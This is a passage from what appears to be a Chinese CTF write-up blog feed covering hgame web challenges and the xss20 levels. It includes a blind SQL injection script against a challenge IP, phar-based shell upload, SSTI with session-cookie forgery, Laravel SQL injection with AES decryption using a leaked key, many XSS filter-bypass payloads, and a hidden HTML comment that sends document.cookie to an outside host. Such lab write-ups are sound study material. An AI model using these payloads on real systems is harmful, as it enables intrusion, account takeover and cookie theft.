class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) <span class="keyword">and</span> mb_strlen($message) &gt; <span class="number">6</span>) &#123;</span><br><span class="line">            $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">            $user = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">            $sql_query = <span class="string">"insert into `messages`(`user_id`,`user`,`content`) VALUES($user_id,'$user','$message')"</span>;</span><br><span class="line">            sql_query($sql_query);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"login error"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"length error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_message</span><span class="params">($message_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'token'</span>] === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_SESSION[<span class="string">'groups'</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">            $sql_query = <span class="string">"delete from `messages` where `message_id`=$message_id and `user_id`=$user_id"</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($_SESSION[<span class="string">'groups'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">            $sql_query = <span class="string">"delete from `messages` where `message_id`=$message_id"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sql_query($sql_query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_filename</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $tmp = `cat /dev/urandom | head -n <span class="number">10</span> | md5sum | head -c <span class="number">15</span>`;</span><br><span class="line">    $sql_query = <span class="string">"select `avatar` from `users` where `avatar`=$tmp"</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> rand_filename();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_avatar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $type = $_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'image/gif'</span> || $type == <span class="string">'image/jpeg'</span> || $type == <span class="string">'image/png'</span>) &#123;</span><br><span class="line">        $avatar = get_avatar($user_id);</span><br><span class="line">        <span class="keyword">if</span> ($avatar == <span class="keyword">null</span>) &#123;</span><br><span class="line">            $name = rand_filename();</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">"./img/avatar/"</span> . $name . <span class="string">".png"</span>);</span><br><span class="line">            $sql_query = <span class="string">"update `users` set `avatar`='$name' WHERE `user_id`=$user_id"</span>;</span><br><span class="line">            sql_query($sql_query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">"./img/avatar/"</span> . $avatar[<span class="string">'name'</span>] . <span class="string">".png"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change_password</span><span class="params">($opassword, $npassword, $npasswod_again)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (judge($_SESSION[<span class="string">'user'</span>], $npassword)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($npasswod_again !== $npassword) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"difference error"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">            $sql_query = <span class="string">"select `password` from `users` where `user_id`=$user_id"</span>;</span><br><span class="line">            $res = sql_query($sql_query);</span><br><span class="line">            <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($res-&gt;fetch_row()[<span class="number">0</span>] === md5($opassword)) &#123;</span><br><span class="line">                    $sql_query = <span class="string">"update `users` set `password`=md5($npassword) WHERE `user_id`=$user_id"</span>;</span><br><span class="line">                    $res = sql_query($sql_query);</span><br><span class="line">                    <span class="keyword">echo</span> $res;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"successful"</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"oldpassword error"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>审计代码可知，存在一处图片上传，但是不知道文件名，题目中有很多sql语句，都用addslashes()函数转义过了，字符型注入无法实施，但是在delete_message中存在数字型注入<code>$sql_query = “delete from <code>messages</code> where <code>message_id</code>=$message_id and <code>user_id</code>=$user_id”;</code>，参数可控且没有单引号（addslashes()过滤无效），我们可以通过时间盲注来获取我们当前用户对应的文件名，token是一次一刷新，需要每次都获取，代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">"groups"</span>:<span class="string">"0"</span>,</span><br><span class="line">    <span class="string">"PHPSESSID"</span>:<span class="string">"c419fq3ppu11r1o2tra4l9rlnm"</span>,</span><br><span class="line">    <span class="string">"user"</span>:<span class="string">"snowtest"</span></span><br><span class="line">&#125;</span><br><span class="line">url_del = <span class="string">'http://111.231.140.29:10080/messages_api.php?action=delete'</span></span><br><span class="line">url = <span class="string">'http://111.231.140.29:10080/index.php?action=message'</span></span><br><span class="line">message = <span class="string">"7469 and if(ascii((substr((select avatar from users where username like 0x736e6f777425 limit 1),&#123;&#125;,1)))=&#123;&#125;,sleep(5),0)#"</span></span><br><span class="line">avatar = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">34</span>,<span class="number">127</span>):</span><br><span class="line">        r = requests.get(url,cookies=cookies)</span><br><span class="line">        token = re.findall(<span class="string">r"value='(.*)' id='token'&gt;"</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        data = dict(token=token,message_id=message.format(i,j))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url_del,cookies=cookies,data=data,timeout=<span class="number">4</span>)  </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            avatar += chr(j)</span><br><span class="line">            print(avatar)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><br>可以得到我的账号对应的文件名为<code>1bce72251d3c333</code>，在upload_avatar()中会在文件名后面强行拼接png后缀<code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;./img/avatar/&quot; . $name . &quot;.png&quot;);</code>，也就是最终上传的文件名会被命名为<code>1bce72251d3c333.png</code>，如果直接写入shell肯定是无法执行的，不过前面我们读源码的时候利用了<code>require $page .&#39;.php&#39;;</code>，所以我们可以利用phar协议来getshell，在本地写一个shell，然后打包为zip文件，修改文件头并上传</p><p><img src="https://i.loli.net/2019/02/19/5c6bdd1d45b16.png" alt><br>然后上传，之后访问<code>http://111.231.140.29:10080/index.php?action=phar://img/avatar/1bce72251d3c333.png/shell</code>即可getshell</p><p>然后就是文件探测了，可以使用find命令<code>snow=system(&#39;find / -name &quot;*flag*&quot;&#39;);</code>，最终payload</p><p><img src="https://i.loli.net/2019/02/19/5c6bde110e9a2.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;e4616b38e22d1a22cedc53a90cfaa87f75ccbfe565399857a390950a58a94e68&#125;</span><br></pre></td></tr></table></figure><h2 id="BabyXss"><a href="#BabyXss" class="headerlink" title="BabyXss"></a>BabyXss</h2><p>题目环境有点问题</p><!-- <scr<script>ipt>$.get('http://120.77.176.134/?cookie=' + document.cookie);</scr<script>ipt> --><h1 id="WEEK-4"><a href="#WEEK-4" class="headerlink" title="WEEK-4"></a>WEEK-4</h1><h2 id="happypython"><a href="#happypython" class="headerlink" title="happypython"></a>happypython</h2><p>python下的ssti，自己当时做的时候想到了要获取secret_key的思路，但是可惜没想到ssti，自己对框架相关问题了解的太少了，以后要在这方面加强一下，简单测试一下可以发现该框架是存在模板注入的问题的<code>http://118.25.18.223:3001/{{1+1}}</code></p><p><img src="https://i.loli.net/2019/02/26/5c7529f34783c.png" alt></p><p>接下来读取配置文件<code>http://118.25.18.223:3001/{{config}}</code>，可以获取到secret_key</p><p><img src="https://i.loli.net/2019/02/26/5c752a50e3200.png" alt></p><p>解一下cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python session.py decode -c .eJwlj0FqQzEMBe_idRaSLMl2LvORZYmGQAv_J6vSu8fQ1ayGee-3HHnG9VXur_Mdt3I8VrkXEETAdKvkc1EbK5fG0D4oXKR3DND0qSbUGy1gHwTeONI8RxCLVOWuWmU2iC27qzNrwuSKCpDTbCipEfQxyY3Fos2-nGKWW_HrzOP184zvvUexCUtm3wzlXRAbKQwzrCOtMJJel2zvfcX5fwIRy98HJ4Y_iA.XHUmGA.wO2v6jNOPBHknlA5tAqik2bE_hI -s 9RxdzNwq7!nOoK3*</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;u&#39;csrf_token&#39;: u&#39;617545ff8175e64f9e5a9f540bea812dea2583d5&#39;, u&#39;_fresh&#39;: True, u&#39;user_id&#39;: u&#39;111&#39;, u&#39;_id&#39;: u&#39;051101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a2089b2ca45ae7b8dc2eb&#39;&#125;</span><br></pre></td></tr></table></figure><p>猜测user_id可能代表的是用户id，猜测admin的用户ID为1，修改一下id为1伪造cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python session_cookie_manager.py encode -s 9RxdzNwq7!nOoK3* -t &#123;&#39;csrf_token&#39;:&#39;617545ff8175e64f9e5a9f540bea812dea2583d5&#39;,&#39;_fresh&#39;:True,&#39;user_id&#39;:&#39;1&#39;,&#39;_id&#39;:&#39;0 51101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a208 9b2ca45ae7b8dc2eb&#39;&#125;</span><br></pre></td></tr></table></figure><p>然后将生成的cookie覆盖原来cookie即可得到flag</p><p><img src="https://i.loli.net/2019/02/26/5c752b920389a.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Qu_bu_la1_m1ng_z1_14&#125;</span><br></pre></td></tr></table></figure><p>ps: 这题我入了一个坑点，在伪造cookie的时候，命令行下老是报错<code>ValueError: dictionary update sequence element #0 has length 1; 2 is required</code>，查看了一下代码发现是在dict()函数处报错的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br></pre></td></tr></table></figure><p>但是同样的代码在linux下就可以正常运行，测试了一下发现在windows下dict的参数其实是类似于<code>{aa:aa}</code>，而linux下却是<code>{&#39;aa&#39;:&#39;aa&#39;}</code>，命令行输入是完全相同的，显然windows下的参数无法正确执行，经过研究发现是<code>&quot;</code>捣的鬼，在windows下我们输入的<code>&quot;</code>是不会被捕获的，只会捕获双引号里面的内容，而单引号不存在这个问题，如果想要输入双引号必须要反斜杠转义，举个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    print(sys.argv[i])</span><br></pre></td></tr></table></figure><p>我们输入<code>python b.py &quot;key&quot;:&quot;value&quot; &#39;key&#39;:&#39;value&#39; \&quot;\&#39;</code>，此时输出为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b.py</span><br><span class="line">key:value</span><br><span class="line">&#39;key&#39;:&#39;value&#39;</span><br><span class="line">&quot;\&#39;</span><br></pre></td></tr></table></figure></p><p>这就是区别，应该是windows特性的问题，自己被坑了好久还以为自己做的不对（泪奔~~~~~）</p><h2 id="happyPHP"><a href="#happyPHP" class="headerlink" title="happyPHP"></a>happyPHP</h2><p>正常注册之后登录，查看源代码可以得到项目源代码<code>!--https://github.com/Lou00/laravel--&gt;</code></p><p>审计代码时，一般应该从路由开始看起，看一共有哪些页面，实现了哪些功能，对于laraval来说，我们先从routes/web.php开始审计</p><p><img src="https://i.loli.net/2019/02/27/5c75e272afb23.png" alt></p><p>可以看到实现的路由，例如对第一行来说，表示的意思就是将根目录发送给StaticPagesController控制器下的home方法进行解析，name方法用来命令路由，便于后期的维护。</p><p>app中的文件是框架的核心控制部分，我们查看一下该部分看看，在SessionController.php中发现了问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Auth::attempt($credentials)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (Auth::user()-&gt;id ===<span class="number">1</span>)&#123;</span><br><span class="line">        session()-&gt;flash(<span class="string">'info'</span>,<span class="string">'flag :******'</span>);</span><br><span class="line">        <span class="keyword">return</span> redirect()-&gt;route(<span class="string">'users.show'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $name = DB::select(<span class="string">"SELECT name FROM `users` WHERE `name`='"</span>.Auth::user()-&gt;name.<span class="string">"'"</span>);</span><br><span class="line">    session()-&gt;flash(<span class="string">'info'</span>, <span class="string">'hello '</span>.$name[<span class="number">0</span>]-&gt;name);</span><br><span class="line">    <span class="keyword">return</span> redirect()-&gt;route(<span class="string">'users.show'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到此处存在sql语句，在laraval中有更加安全的sql查询方式，这儿显然存在问题的，存在sql注入问题，我们可以注册一个用户名为<code>&#39; union select group_concat(email,password) from users where id=1#</code>，然后登录即可获得该用户的email和密码（因为题目要求id=1的用户登录才可以得到flag），</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin@hgame.comeyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>密码是经过加密的，解密一下</p><blockquote><p>{“iv”:”rnVrqfCvfJgnvSTi9z7KLw==”,”value”:”EaR/4fldOGP1G/aDK8e8u1Aldmxl+yB3s+kBAaoPods=”,”mac”:”56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af”}</p></blockquote><p>查看配置文件可以发现使用了aes加密，但是key值不知道<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;key&#39; &#x3D;&gt; env(&#39;APP_KEY&#39;),</span><br><span class="line">&#39;cipher&#39; &#x3D;&gt; &#39;AES-256-CBC&#39;,</span><br></pre></td></tr></table></figure></p><p>回滚git版本找到key值</p><blockquote><p>APP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=</p></blockquote><p>接下来编写解密脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">iv = <span class="string">'rnVrqfCvfJgnvSTi9z7KLw=='</span></span><br><span class="line">value = <span class="string">'EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods='</span></span><br><span class="line">enc = <span class="string">'9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='</span></span><br><span class="line">enc = base64.b64decode(enc)</span><br><span class="line">iv = base64.b64decode(iv)</span><br><span class="line">value = base64.b64decode(value)</span><br><span class="line">cryptor = AES.new(enc,AES.MODE_CBC,iv)</span><br><span class="line">con = cryptor.decrypt(value)</span><br><span class="line"><span class="keyword">print</span> con</span><br></pre></td></tr></table></figure></p><p>可以得到密码为<code>9pqfPIer0Ir9UUfR</code>，登录即可得到flag</p><p><img src="https://i.loli.net/2019/02/27/5c75f88d0fb45.png" alt></p><p><strong><em>Reference：</em></strong></p><ol><li><a href="https://xz.aliyun.com/t/3161" target="_blank" rel="noopener">https://xz.aliyun.com/t/3161</a></li><li><a href="https://zry.io/archives/183" target="_blank" rel="noopener">https://zry.io/archives/183</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;week-3&quot;&gt;&lt;a href=&quot;#week-3&quot; class=&quot;headerlink&quot; title=&quot;week-3&quot;&gt;&lt;/a&gt;week-3&lt;/h1&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>XSS20冲关之旅</title>
    <link href="http://chaosec.top/2019/03/02/xss20/"/>
    <id>http://chaosec.top/2019/03/02/xss20/</id>
    <published>2019-03-01T16:09:49.000Z</published>
    <updated>2020-09-19T09:47:47.220Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近学到了xss漏洞，来做一下这个xss题目</p><a id="more"></a><h1 id="XSS-1"><a href="#XSS-1" class="headerlink" title="XSS-1"></a>XSS-1</h1><p>第一关热身，没有任何过滤。payload：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p><h1 id="XSS-2"><a href="#XSS-2" class="headerlink" title="XSS-2"></a>XSS-2</h1><p>查看代码可知<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br></pre></td></tr></table></figure></p><p>对于输入的内容，题目使用了htmlspecialchars来转义特殊字符，此处不好绕过，但是题目在input标签中却没有验证参数而直接输入，此时我们可以构造payload闭合input标签</p><p>payload: <code>keyword=&quot;&gt;  &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，此时在代码中input标签的内容就变成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword value&#x3D;&quot;&quot;&gt;  &lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>成功成为了两个标签从而xss成功</p><h1 id="XSS-3"><a href="#XSS-3" class="headerlink" title="XSS-3"></a>XSS-3</h1><p>这此input标签也被转义了，所以只能正面绕过htmlspecialchar()函数了，百度可以发现该函数默认是不转义单引号的，只有设置了quotestyle 选项为ENT_QUOTES才会过滤单引号，而本题又是单引号闭合的所以用单引号即可绕过</p><p>payload: <code>http://localhost/xss20/level3.php?keyword=&#39; onclick=&#39;window.alert()&#39;</code></p><p><img src="/2019/03/02/xss20/1.png" alt></p><h1 id="XSS-4"><a href="#XSS-4" class="headerlink" title="XSS-4"></a>XSS-4</h1><p>我们可以先fuzz一下，输入<code>&lt;script&gt;&#39;&quot;</code>，然后查看源代码可知</p><p><img src="/2019/03/02/xss20/2.png" alt></p><p>可以看到题目将左右尖括号置换为空，但是单双引号都还可以用，本题是用双引号闭合的，所以只需要把第三关的稍微改一下即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level4.php?keyword&#x3D;&quot; onclick&#x3D;&quot;window.alert()&quot;</span><br></pre></td></tr></table></figure><h1 id="XSS-5"><a href="#XSS-5" class="headerlink" title="XSS-5"></a>XSS-5</h1><p>想上一关测试一下<code>&lt;script&gt;&#39;&quot;</code>，发现scirpt被转成了scr_ipt，我们可以尝试上关的payload闭合双引号，但是发现onclick被置换成了o_nclick，换个思路，第二题中由于题目没有过滤<code>&lt;&gt;</code>，我们可以另行构造一个标签，在本题中也没有单独过滤这两个符号，所以可以用类似第二关的方式绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level5.php?keyword&#x3D;&quot;&gt;&lt;a href&#x3D;javascript:alert(19)&gt;</span><br></pre></td></tr></table></figure></p><p>查看源代码可知题目采用黑名单过滤了<code>&lt;script</code>和<code>on</code>两个敏感词</p><h1 id="XSS-6"><a href="#XSS-6" class="headerlink" title="XSS-6"></a>XSS-6</h1><p>测试<code>&lt;script&gt;&#39;&quot;on</code>，发现还是基本和上关的过滤一样，<code>&lt;input name=keyword  value=&quot;&lt;scr_ipt&gt;&#39;&quot;o_n&quot;&gt;</code>，用上题payload故技重施，发现并没有那么简单，<code>href</code>被置换成了<code>hr_ef</code>，继续测试<code>data,action,formaction</code>，继续测试可以发现很多都被过滤了，走投无路之下大小写绕过试了一下居然就过了，可我记得上道题是大小写不敏感的呀…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level6.php?keyword&#x3D;&quot;&gt;&lt;a Href&#x3D;javascript:alert(19)&gt;</span><br></pre></td></tr></table></figure></p><h1 id="XSS-7"><a href="#XSS-7" class="headerlink" title="XSS-7"></a>XSS-7</h1><p>继续测试<code>&lt;script&gt;&#39;&quot;on</code>-&gt;<code>&lt;&gt;&#39;&quot;on</code>，猜测可能是将script置换为空字符，尝试双写绕过<code>&lt;scscriptript&gt;</code>，成功！对于其他敏感词如<code>on</code>等也可以用双写绕过，之前都是将敏感字符加下划线，本题是转化为空字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level7.php?keyword&#x3D;&quot; oonnclick&#x3D;&quot;window.alert()</span><br></pre></td></tr></table></figure></p><h1 id="XSS-8"><a href="#XSS-8" class="headerlink" title="XSS-8"></a>XSS-8</h1><p>测试<code>script&gt;&lt;&#39;&quot;</code></p><p><img src="/2019/03/02/xss20/7.png" alt></p><p>可以看到对于a标签来说只过滤了双引号，还有将<code>script</code>替换成了<code>scr_ipt</code>，由于过滤了双引号，所以我们之前的闭合双引号构造其它标签的方法就不行了，只能在<code>href=&quot;&quot;</code>上面做文章，本来我们可以提交<code>javascript:alert()</code>，但是题目污染了script敏感词，不过我们可以使用html实体编码绕过（即&amp;#开头的编码方式）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level8.php?keyword&#x3D;java&amp;#115;cript:alert(&#39;xss&#39;)</span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br></pre></td></tr></table></figure><p>查看后台代码可知题目果然就是直接将敏感词转换，所以确实存在编码绕过的问题的</p><hr><h1 id="浏览器解码方式与XSS"><a href="#浏览器解码方式与XSS" class="headerlink" title="浏览器解码方式与XSS"></a>浏览器解码方式与XSS</h1><p>在上一关中，我们利用html实体编码实现了弹窗， 想要探究这些问题的原理，我们就必须去了解一下浏览器究竟是怎么解码的</p><p><img src="/2019/03/02/xss20/5.png" alt></p><p>浏览器在解析时，首先由浏览器解析HTML生成DOM树，然后解析CSS生成CSSDOM树，之后JS解释器才开始进行解析执行， 如果碰到URL的话会由URL解释器进行解码，为了我们研究问题，我们可以粗略的把浏览器分为三部分HTML解释器，URL解释器，JS解释器，顺序简化为<code>HTML-&gt;URL-&gt;JS</code><br>各种解释器能够识别的编码方式</p><ul><li>HTML解释器识别的是HTML实体编码，也就是&amp;#xx这种的</li><li>URL解释器可以识别URL编码</li><li>JS解释器可以识别Unicode编码，类似\uxxx</li></ul><blockquote><p>浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别那些被实体编码的内容的，只有建立起DOM 树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码。在此基础上，JavaScript DOM API 参与进来，可以对DOM 树进行修改，改变DOM树的结构和内容。<br>这段话说的比较清楚了，在dom树构建之时，html实体编码是没有被自解码的，那么此时dom树的节点结构就已经被固定了。后续自解码以后并不会影响到dom树/节点/标签的结构。这个道理和sql中的预编译是有些类似的。之后的自解码以后获得的&lt;&gt;将不会被解析成新的节点。 但并不是说dom树构建完毕后就不能被改变了。js是可以操作节点进行增删改操作的。</p></blockquote><p>我们来探讨一下下面四个写法是否能够成功执行JS</p><ol><li><code>&lt;a href=javascript:al\u65rt(1)&gt;click&lt;/a&gt;</code></li><li><code>&lt;a href=javascript:al%65rt(1)&gt;click&lt;/a&gt;</code></li><li><code>&lt;a href=javascript:al&amp;#101;rt(1)&gt;click&lt;/a&gt;</code></li><li><code>&lt;a 